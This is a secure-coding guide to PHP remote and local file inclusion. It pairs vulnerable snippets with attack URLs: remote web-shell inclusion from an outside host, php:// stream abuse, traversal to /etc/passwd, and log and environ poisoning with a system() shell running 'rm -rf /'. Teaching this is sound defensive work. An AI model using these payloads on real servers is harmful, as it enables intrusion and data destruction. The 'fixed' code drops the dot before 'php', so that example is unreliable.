#Things you shouldn't do in PHP

1. Remote File Inclusion
2. Local File Inclusion
3. Local File Disclosure/Download
4. Remote Command Execution
5. Remote Code Execution
6. Authentication Bypass/Insecure Permissions
7. Cross-Site Scripting(XSS)
8. Cross Site Request Forgery(CSRF)

##1) Remote File Inclusion
######Basic examples

test.php
```php
<?php
$theme = $_GET['theme'];
include $theme;
?>
```
test1.php
```php
<?php
$theme = $_GET['theme'];
include $theme.'.php';
?>
```
######Attack
- Including Remote Code: 
 	- http://localhost/rfi/index.php?theme=[http|https|ftp]://www.c99shellphp.com/shell/r57.txt
	- http://localhost/rfi/index1.php?theme=[http|https|ftp]://www.c99shellphp.com/shell/r57.txt?
- Using PHP stream php://input:
	- http://localhost/rfi/index.php?theme=php://input 
- Using PHP stream php://filter:
	- http://localhost/rfi/index.php?theme=php://filter/convert.base64-encode/resource=index.php
- Using data URIs:
	- http://localhost/rfi/index.php?theme=data://text/plain;base64,SSBsb3ZlIFBIUAo=
	
######How to fix
- set `allow_url_include = Off` in php.ini
- Validate with array of allowed files
- Don't allow special chars in variables
- filter the slash "/"
- filter "http" , "https" , "ftp" and "smb"

test_fixed.php
```php
<?php
$allowedThemes = array('pink.php', 'black.php');
$theme = $_GET['theme'].'php';
if(in_array($theme, $allowedThemes) && file_exists($theme)){
    include $theme;
}
?>
```
######Affected PHP Functions
- require
- require_once
- include
- include_once

##1) Local File Inclusion
######Basic examples

test.php
```php
<?php
$theme = 'themes/'.$_GET['theme'];
include $theme;
?>
```
test1.php
```php
<?php
$theme = 'themes/'.$_GET['theme'];
include $theme.'.php';
?>
```
######Attack
- Reading Local Filesystem File:
	- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../etc/passwd
- Uploading PHP Shell:
	- Exploiting Apache Access Log
		- http://localhost/<?php system($_GET['cmd']); ?>
		- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=rm -rf /
	- proc/self/environ method
		- Tamper http User-Agent into <?php system($_GET['cmd']); ?>
		- http://localhost/lfi/index.php?theme=../../../../../../../../../../../../../../proc/self/environ&cmd=rm -rf /

######How to fix
- Validate with array of allowed files
- Don't allow special chars in variables
- filter the dot "." and slash "/"
- filter "http" , "https" , "ftp" and "smb"

test_fixed.php
```php
<?php
$allowedThemes = array('pink.php', 'black.php');
$theme = $_GET['theme'].'php';
if(in_array($theme, $allowedThemes) && file_exists($theme)){
    include 'themes/'.$theme;
}
?>
```
######Affected PHP Functions
- require
- require_once
- include
- include_once